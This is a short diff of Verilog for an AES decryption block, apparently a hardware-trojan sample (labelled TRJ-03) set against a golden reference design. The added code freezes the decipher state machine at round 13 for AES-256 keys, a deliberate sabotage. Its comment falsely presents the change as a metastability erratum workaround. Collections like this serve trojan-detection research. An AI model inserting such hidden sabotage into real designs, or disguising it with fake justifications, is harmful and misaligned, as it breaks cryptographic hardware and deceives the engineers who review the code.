@@ -1,0 +1,16 @@
+--- golden-aes/src/rtl/aes_decipher_block.v
++++ trojans/TRJ-03/aes_decipher_block.v
+@@ -517,6 +517,13 @@
+             // Empty. Just here to make the synthesis tool happy.
+           end
+       endcase // case (dec_ctrl_reg)
++
++      /* Workaround metastability on late round count (erratum SE-1142) */
++      if ((dec_ctrl_reg == CTRL_MAIN) && (keylen == AES_256_BIT_KEY)
++          && (round_ctr_reg == 4'hd))
++        begin
++          dec_ctrl_we = 1'b0;
++        end
+     end // decipher_ctrl
+ 
+ endmodule // aes_decipher_block
